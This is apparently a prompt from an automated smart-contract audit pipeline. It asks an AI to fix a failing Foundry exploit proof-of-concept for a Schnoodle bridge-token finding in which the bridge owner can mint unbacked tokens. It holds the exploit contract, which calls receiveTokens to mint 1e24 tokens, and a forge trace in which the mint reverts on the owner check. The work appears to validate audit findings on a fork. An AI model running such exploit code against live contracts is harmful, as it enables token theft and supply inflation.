You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Bridge owner can mint arbitrary unbacked tokens without consuming any burn record
- claim: `sendTokens` only burns tokens and increments an informational `_tokensSent` counter, while `receiveTokens` only checks that the caller is `_bridgeOwner` and that `_feesPaid[account][networkId] >= fee`. It never verifies that `amount` matches any prior burn, never consumes a burn record, and even allows `fee = 0`, so `_bridgeOwner` can mint any amount to any account at will.
- impact: A malicious or compromised bridge owner can inflate supply arbitrarily, mint unbacked tokens to itself or collaborators, dump them, and destroy the token's value. Honest users who burn for bridging also have no on-chain guarantee that the destination mint matches what was burned.
- exploit_paths: ["User burns through `sendTokens(networkId, amount)`; only `_tokensSent` is incremented and no claim record is locked or consumed.", "`_bridgeOwner` calls `receiveTokens(attacker, anyNetworkId, hugeAmount, 0)`.", "The contract mints `hugeAmount` to the attacker without proving or matching any prior burn."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISchnoodleBridgeToken {
    function balanceOf(address account) external view returns (uint256);
    function getBridgeOwner() external view returns (address);
    function sendTokens(uint256 networkId, uint256 amount) external;
    function receiveTokens(address account, uint256 networkId, uint256 amount, uint256 fee) external;
    function tokensSent(address account, uint256 networkId) external view returns (uint256);
    function tokensReceived(address account, uint256 networkId) external view returns (uint256);
}

contract FlawVerifier {
    ISchnoodleBridgeToken private constant TARGET = ISchnoodleBridgeToken(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);

    uint256 private constant NETWORK_ID = 1;
    uint256 private constant ONE_TOKEN = 1e18;
    uint256 private constant MINT_AMOUNT = 1_000_000 * ONE_TOKEN;

    uint256 private _profitAmount;
    address private _bridgeOwner;
    uint256 private _startingBalance;
    uint256 private _endingBalance;

    uint256 public burnAmountAttempted;
    uint256 public tokensSentBefore;
    uint256 public tokensSentAfter;
    uint256 public tokensReceivedBefore;
    uint256 public tokensReceivedAfter;

    bool public burnStageAttempted;
    bool public burnStageSucceeded;
    bool public mintStageAttempted;
    bool public mintStageSucceeded;
    bool public burnStageInfeasible;

    bytes public lastMintRevertData;

    constructor() {}

    function executeOnOpportunity() public {
        _bridgeOwner = _readBridgeOwner();
        _startingBalance = TARGET.balanceOf(address(this));
        tokensSentBefore = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedBefore = _safeTokensReceived(address(this), NETWORK_ID);

        // exploit path stage 1:
        // A user burns through `sendTokens(networkId, amount)`.
        // Under the required `direct_or_existing_balance_first` strategy, the verifier only uses
        // verifier-held SNOOD. If it starts with zero SNOOD on the fork, this stage is mechanically
        // infeasible without introducing unrelated external funding.
        uint256 available = _startingBalance;
        if (available == 0) {
            burnStageInfeasible = true;
        } else {
            burnStageAttempted = true;
            burnAmountAttempted = available >= ONE_TOKEN ? ONE_TOKEN : available;
            try TARGET.sendTokens(NETWORK_ID, burnAmountAttempted) {
                burnStageSucceeded = true;
            } catch {
                burnStageSucceeded = false;
            }
        }

        tokensSentAfter = _safeTokensSent(address(this), NETWORK_ID);

        // exploit path stages 2 and 3:
        // `_bridgeOwner` calls `receiveTokens(attacker, anyNetworkId, hugeAmount, 0)`.
        // This verifier attempts the mint directly. If it reverts, the on-chain blocker at the fork
        // is concrete and mechanical: `receiveTokens` requires `msg.sender == _bridgeOwner`, and an
        // unprivileged verifier cannot satisfy that check without the bridge-owner key or a public
        // call-through on the bridge-owner address itself.
        mintStageAttempted = true;
        (mintStageSucceeded, lastMintRevertData) = address(TARGET).call(
            abi.encodeWithSelector(
                TARGET.receiveTokens.selector,
                address(this),
                NETWORK_ID,
                MINT_AMOUNT,
                0
            )
        );

        tokensReceivedAfter = _safeTokensReceived(address(this), NETWORK_ID);
        _endingBalance = TARGET.balanceOf(address(this));
        _profitAmount = _endingBalance > _startingBalance ? _endingBalance - _startingBalance : 0;
    }

    function profitToken() external pure returns (address) {
        return address(TARGET);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function bridgeOwner() external view returns (address) {
        return _bridgeOwner;
    }

    function startingBalance() external view returns (uint256) {
        return _startingBalance;
    }

    function endingBalance() external view returns (uint256) {
        return _endingBalance;
    }

    function requestedMintAmount() external pure returns (uint256) {
        return MINT_AMOUNT;
    }

    function _readBridgeOwner() internal view returns (address owner_) {
        try TARGET.getBridgeOwner() returns (address resolved) {
            owner_ = resolved;
        } catch {
            owner_ = address(0);
        }
    }

    function _safeTokensSent(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensSent(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }

    function _safeTokensReceived(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensReceived(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }
}

```

forge stdout (tail):
```
EI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xD45740aB9ec920bEdBD9BAb2E863519E59731941
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 2141

Traces:
  [244579] FlawVerifierTest::testExploit()
    ├─ [205] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941
    ├─ [10059] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [2728] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [195727] FlawVerifier::executeOnOpportunity()
    │   ├─ [3261] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::getBridgeOwner() [staticcall]
    │   │   ├─ [2433] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::getBridgeOwner() [delegatecall]
    │   │   │   └─ ← [Return] 0x3Fb6E133a40Af01Bb6dA475EB6c9F68AFe1C845A
    │   │   └─ ← [Return] 0x3Fb6E133a40Af01Bb6dA475EB6c9F68AFe1C845A
    │   ├─ [1559] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [728] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [3599] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::tokensSent(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [staticcall]
    │   │   ├─ [2765] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::tokensSent(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [3532] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::tokensReceived(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [staticcall]
    │   │   ├─ [2698] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::tokensReceived(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1599] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::tokensSent(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [staticcall]
    │   │   ├─ [765] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::tokensSent(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1632] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::receiveTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1, 1000000000000000000000000 [1e24], 0)
    │   │   ├─ [773] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::receiveTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1, 1000000000000000000000000 [1e24], 0) [delegatecall]
    │   │   │   └─ ← [Revert] Schnoodle: Sender must be the bridge owner
    │   │   └─ ← [Revert] Schnoodle: Sender must be the bridge owner
    │   ├─ [1532] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::tokensReceived(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [staticcall]
    │   │   ├─ [698] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::tokensReceived(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1559] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [728] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [205] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941
    ├─ [374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [1559] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [728] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xD45740aB9ec920bEdBD9BAb2E863519E59731941)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14983660 [1.498e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2141)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF.receiveTokens
  at 0xD45740aB9ec920bEdBD9BAb2E863519E59731941.receiveTokens
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.69s (534.43ms CPU time)

Ran 1 test suite in 1.74s (1.69s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 244579)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
